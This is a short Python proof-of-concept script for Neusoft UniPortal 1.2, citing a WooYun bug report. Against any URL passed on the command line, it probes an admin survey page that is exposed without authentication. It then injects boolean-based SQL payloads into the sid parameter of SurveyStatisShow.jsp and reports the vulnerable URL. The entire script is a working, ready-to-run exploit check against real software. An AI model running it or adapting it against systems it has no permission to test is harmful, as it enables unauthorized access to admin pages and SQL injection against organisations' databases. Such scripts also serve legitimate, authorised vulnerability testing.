#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 东软UniPortal1.2未授权访问&SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2014-087293
author: Lucifer
description: 未授权访问页面：ecdomain/portal/survey/admin/SurveyStatis.jsp
             SQL注入漏洞页面：/ecdomain/portal/survey/admin/SurveyStatisShow.jsp 参数sid
'''
import sys
import requests


from bs4 import BeautifulSoup

class uniportal_bypass_priv_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/ecdomain/portal/survey/admin/SurveyStatis.jsp"
        vulnurl = self.url + payload
        tlist = []
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"<a href=SurveyStatisShow.jsp" in req.text:
                return "[+]存在东软UniPortal1.2未授权访问漏洞...(高危)\tpayload: "+vulnurl

            soup = BeautifulSoup(req.text, "html.parser")
            html = soup.find_all("a")
            for turl in html:
                turl = turl["href"]
                if "SurveyStatisShow.jsp" in turl:
                    tlist.append(turl)
            tureurl = self.url + "/ecdomain/portal/survey/admin/" + tlist[0] + "%27AnD%271%27=%271"
            falseurl = self.url + "/ecdomain/portal/survey/admin/" + tlist[0] + "%27AnD%271%27=%272"
            req1 = requests.get(tureurl, headers=headers, timeout=10, verify=False)
            req2 = requests.get(falseurl, headers=headers, timeout=10, verify=False)
            if r"ShowText.jsp" in req1.text and r"ShowText.jsp" not in req2.text:
                return "[+]存在东软UniPortal1.2 SQL注入漏洞...(高危)\tpayload: "+falseurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = uniportal_bypass_priv_sqli_BaseVerify(sys.argv[1])
    testVuln.run()